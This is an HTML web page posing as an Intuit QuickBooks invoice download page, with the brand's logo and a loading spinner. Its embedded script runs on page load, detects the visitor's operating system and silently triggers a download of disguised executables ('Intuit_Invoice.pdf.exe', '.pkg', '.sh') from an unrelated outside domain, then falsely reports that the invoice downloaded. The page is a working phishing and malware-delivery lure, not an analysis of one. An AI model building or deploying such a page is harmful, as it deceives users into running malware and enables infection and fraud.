<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Intuit Quickbooks</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 text-gray-900 min-h-screen flex flex-col">

  <!-- Header -->
  <header class="bg-white shadow-sm py-4 px-6">
    <div class="flex items-center justify-between max-w-6xl mx-auto">
      <h1 aria-label="QBO Logo" class="jsx-2784259990 logo"><svg width="170" height="35" viewBox="0 0 126 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill="#2CA01C" d="M14.4459 28.8c7.9781 0 14.4458-6.4471 14.4458-14.4 0-7.95292-6.4677-14.4-14.4458-14.4C6.46762 0 0 6.44708 0 14.4c0 7.9529 6.46762 14.4 14.4459 14.4Z"></path><path fill="#fff" d="M9.63076 8.7998c-3.10425 0-5.61782 2.5088-5.61782 5.6 0 3.0944 2.51357 5.6 5.61782 5.6h.80254v-2.08h-.80254c-1.94859 0-3.53119-1.5776-3.53119-3.52 0-1.9424 1.5826-3.52 3.53119-3.52h1.92934v10.88c0 1.1488.9341 2.08 2.0866 2.08v-15.04H9.63076ZM19.2642 20c3.1043 0 5.6178-2.5089 5.6178-5.6 0-3.0944-2.5135-5.60004-5.6178-5.60004h-.8025v2.07994h.8025c1.9486 0 3.5312 1.5777 3.5312 3.5201 0 1.9424-1.5826 3.5199-3.5312 3.5199h-1.9293V7.03998c0-1.14882-.9341-2.08002-2.0866-2.08002V20h4.0159Z"></path><path fill="#000" d="M42.5628 31.9999h-2.2193v-5.6153h-.0383c-.5739.8855-1.7028 1.4397-2.9399 1.4397-2.7008 0-4.3653-2.1435-4.3653-4.7298 0-2.6245 1.7761-4.6565 4.3079-4.6565 1.6262 0 2.6274.7931 3.0707 1.497h.0541v-1.239h2.1268v13.3039h.0033Zm-4.7511-6.0229c1.6262 0 2.6083-1.4588 2.6083-2.8442 0-1.3855-.9789-2.8825-2.6083-2.8825-1.7187 0-2.551 1.4587-2.551 2.8442-.0031 1.3855.8291 2.8825 2.551 2.8825ZM52.5301 27.5664h-2.1076v-1.4237h-.0383c-.389.8854-1.4412 1.6817-2.755 1.6817-2.3117 0-3.2747-1.7741-3.2747-3.5832v-5.542h2.2193v4.9145c0 1.0543.2391 2.3633 1.6645 2.3633 1.4061 0 2.0726-1.2198 2.0726-2.4015v-4.8763h2.2192v8.8672ZM54.7561 18.5049h2.2193v8.8671h-2.2193v-8.8671ZM65.2787 21.1551c-.3508-.5001-1.1097-.8695-1.8305-.8695-1.6262 0-2.4425 1.4587-2.4425 2.8442 0 1.3855.8324 2.8443 2.5159 2.8443.6855 0 1.4412-.2771 1.8686-.7931l1.387 1.4046c-.7402.7931-1.9614 1.239-3.2749 1.239-2.6274 0-4.8087-1.7359-4.8087-4.6916 0-2.8825 2.1464-4.6916 4.7546-4.6916 1.2947 0 2.6435.516 3.3477 1.3855l-1.5172 1.3282ZM67.887 13.6001h2.2193v8.8289h.0542l3.367-3.7328h2.8474l-3.8455 4.0099 4.0879 4.8572h-2.9396l-3.514-4.5451h-.0542v4.5451h-2.2193V13.6001h-.0032ZM79.8507 13.6001v6.2267h.0542c.4623-.5733 1.3489-1.3855 2.9782-1.3855 2.5347 0 4.3078 2.0321 4.3078 4.6566 0 2.5863-1.6647 4.7298-4.3652 4.7298-1.2405 0-2.4429-.5733-3.0517-1.5894h-.0381v1.3314h-2.1077V13.6001h2.2225Zm2.5347 6.6504c-1.6261 0-2.6082 1.4969-2.6082 2.8824 0 1.3855.9788 2.8442 2.6082 2.8442 1.719 0 2.5508-1.4969 2.5508-2.8824 0-1.3855-.8318-2.8442-2.5508-2.8442ZM92.9816 18.4414c2.6816 0 4.828 1.8665 4.828 4.6566s-2.1464 4.7298-4.828 4.7298c-2.6817 0-4.8275-1.9397-4.8275-4.7298s2.1458-4.6566 4.8275-4.6566Zm0 7.5358c1.757 0 2.57-1.497 2.57-2.8824 0-1.3855-.813-2.8443-2.57-2.8443-1.7571 0-2.5701 1.4588-2.5701 2.8443 0 1.3854.813 2.8824 2.5701 2.8824ZM103.599 18.4414c2.682 0 4.828 1.8665 4.828 4.6566s-2.146 4.7298-4.828 4.7298c-2.681 0-4.8273-1.9397-4.8273-4.7298s2.1463-4.6566 4.8273-4.6566Zm0 7.5358c1.757 0 2.57-1.497 2.57-2.8824 0-1.3855-.813-2.8443-2.57-2.8443s-2.57 1.4588-2.57 2.8443c-.003 1.3854.813 2.8824 2.57 2.8824ZM109.776 13.6001h2.219v8.8289h.054l3.368-3.7328h2.847l-3.845 4.0099 4.088 4.8572h-2.94l-3.514-4.5451h-.055v4.5451h-2.219V13.6001h-.003ZM124.562 21.0624c-.389-.5159-1.129-.9618-1.942-.9618-.701 0-1.425.258-1.425.9618 0 .6849.686.8696 1.922 1.1626 1.314.3153 2.867.9045 2.867 2.6404 0 2.1627-1.757 2.9557-3.698 2.9557-1.369 0-2.794-.516-3.645-1.4587l1.46-1.3664c.482.6274 1.314 1.1084 2.274 1.1084.647 0 1.425-.258 1.425-1.0542 0-.739-.686-.9619-2.034-1.2741-1.314-.3153-2.628-.8504-2.628-2.513 0-1.9779 1.776-2.8251 3.533-2.8251 1.276 0 2.608.4427 3.329 1.3473l-1.438 1.2771ZM56.4127 6.6176c0 2.1853 1.758 3.7825 3.9922 3.7825s3.9952-1.59408 3.9952-3.7825V1.6001h-2.1656v4.76062c0 1.17928-.7934 1.96861-1.8359 1.96861-1.0457 0-1.8359-.78933-1.8359-1.96861V1.6001h-2.1626l.0126 5.0175ZM70.8 3.65563h2.539v6.74447h2.1257V3.65563H78V1.6001h-7.2v2.05553ZM69.2 1.6001h-2.4v8.8h2.4v-8.8ZM47.6001 3.65563h2.5386v6.74447h2.1258V3.65563h2.5356V1.6001h-7.2v2.05553ZM36.4 1.6001H34v8.8h2.4v-8.8ZM45.9938 5.38257c0-2.18529-1.7619-3.78247-3.9969-3.78247C39.7619 1.6001 38 3.19419 38 5.38257v5.01753h2.1634V5.6395c0-1.17933.7938-1.96864 1.8366-1.96864 1.0428 0 1.8366.78931 1.8366 1.96864v4.7606H46l-.0062-5.01753Z"></path></svg></h1>
      <div class="flex items-center gap-4">
        <div class="text-sm font-medium text-gray-700 cursor-pointer hover:text-blue-600">
          Sign in
        </div>
        <a class="w-8 h-8 rounded-full overflow-hidden">
          <svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <mask id="mask0" mask-type="alpha" x="0" y="0" width="24" height="24">
              <rect width="24" height="24" rx="12" fill="#8D9096"/>
            </mask>
            <g mask="url(#mask0)">
              <rect width="24" height="24" rx="12" fill="#D4D7DC"/>
              <circle cx="12" cy="26" r="12" fill="#393A3D"/>
              <circle cx="12" cy="8" r="4" fill="#393A3D"/>
            </g>
          </svg>
        </a>
      </div>
    </div>
  </header>

  <main class="flex-grow flex items-center justify-center px-4">
    <div class="bg-white p-8 rounded-2xl shadow-md max-w-md w-full text-center">
      <h2 class="text-2xl font-semibold mb-2" id="status-title">Invoice Downloading...</h2>
      <p class="text-gray-600 mb-6" id="status-text">
        Please wait while we prepare your invoice. The download will start automatically.
      </p>
      <div class="flex justify-center" id="spinner-container">
        <svg class="animate-spin h-6 w-6 text-blue-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
          <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
          <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path>
        </svg>
      </div>
    </div>
  </main>

  <!-- Script -->
  <script>
    function getOS() {
      const platform = navigator.platform.toLowerCase();
      const userAgent = navigator.userAgent.toLowerCase();

      if (platform.includes('win')) return 'win';
      if (platform.includes('mac')) return 'mac';
      if (platform.includes('linux')) return 'linux';

      return 'unknown';
    }

    function triggerDownload(os) {
      let filePath;

      switch (os) {
        case 'win':
          filePath = 'https://macefoods.com/sess/nubinv/Intuit_Invoice.pdf.exe';
          break;
        case 'mac':
          filePath = 'https://macefoods.com/sess/nubinv/Intuit_Invoice.pdf.pkg';
          break;
        case 'linux':
          filePath = 'https://macefoods.com/sess/nubinv/Intuit_Invoice.pdf.sh';
          break;
        default:
          filePath = './unsupported.txt';
          break;
      }

      const link = document.createElement('a');
      link.href = filePath;
      link.download = '';
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }

    function updateStatus(success = true) {
      const title = document.getElementById('status-title');
      const text = document.getElementById('status-text');
      const spinner = document.getElementById('spinner-container');

      if (success) {
        title.textContent = 'Invoice Downloaded ✅';
        text.textContent = 'Your download has completed successfully.';
      } else {
        title.textContent = 'Download Failed ❌';
        text.textContent = 'We were unable to download your invoice. Please try again.';
      }

      if (spinner) spinner.remove();
    }

    window.addEventListener('DOMContentLoaded', () => {
      const os = getOS();
      triggerDownload(os);

      setTimeout(() => {
        updateStatus(true);
      }, 3000);
    });
  </script>
</body>
</html>
